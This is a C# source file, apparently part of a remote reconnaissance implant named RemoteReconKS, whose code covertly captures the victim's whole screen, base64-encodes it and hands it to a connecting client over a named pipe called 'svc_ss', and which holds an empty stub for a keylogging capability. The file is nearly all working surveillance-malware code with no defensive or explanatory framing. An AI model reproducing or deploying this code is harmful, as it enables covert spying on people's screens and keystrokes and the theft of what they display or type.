using System;
using System.IO;
using System.IO.Pipes;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteReconKS
{
    public class RemoteReconKS
    {

        private static NamedPipeServerStream server;
        private static StreamWriter sw;

        public static void Main(string[] arg)
        {
#if DEBUG
            Execute("screenshot");
#else
#endif
        }

        public static void Execute(string capability)
        {
            if (capability.ToLower() == "screenshot")
            {
                server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                server.WaitForConnection();
                sw = new StreamWriter(server);

                //byte[] image = screenshot();
                sw.WriteLine(screenshot());
                Thread.Sleep(5000);
                sw.Flush();

                server.Close();
            }
            else if(capability.ToLower() == "keylog")
            {
                
            }
        }

        public static string screenshot()
        {

            try
            {
                string encImage;
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }

    }
}
